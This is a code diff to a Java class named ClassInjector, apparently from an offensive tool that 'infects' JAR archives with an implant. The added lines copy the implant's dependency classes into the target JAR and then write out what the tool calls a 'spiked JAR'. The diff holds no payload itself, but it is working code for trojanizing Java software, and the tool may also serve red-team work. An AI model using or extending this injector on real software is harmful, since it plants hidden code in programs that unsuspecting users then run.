@@ -6,6 +6,7 @@ import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.file.Path;
+import java.util.Map;
 import java.util.jar.JarEntry;
 import java.util.zip.ZipException;
 
@@ -74,6 +75,25 @@ public class ClassInjector {
             }
 
             boolean didInfect = implantedClass != null;
+
+            // Add any dependency classes needed for the implant
+            if (didInfect) {
+                for (Map.Entry<String, byte[]> dependencyEntry : implantHandler.getDependencies().entrySet()) {
+                    String fileName = convertToJarEntryPathName(dependencyEntry.getKey());
+                    byte[] fileContent = dependencyEntry.getValue();
+
+                    JarEntry newJarEntry = new JarEntry(fileName);
+                    try {
+                        fiddler.addNewEntry(newJarEntry, fileContent);
+                        System.out.println("[+] Added dependency file '" + fileName + "'.");
+                    } catch (ZipException e) {
+                        System.out.println("[!] Dependency file '" + fileName + "' already exist. Aborting.");
+                        didInfect = false;
+                        break;
+                    }
+                }
+            }
+
             if (didInfect) {
                 fiddler.write(outputJar);
                 System.out.println("[+] Wrote spiked JAR to " + outputJar);
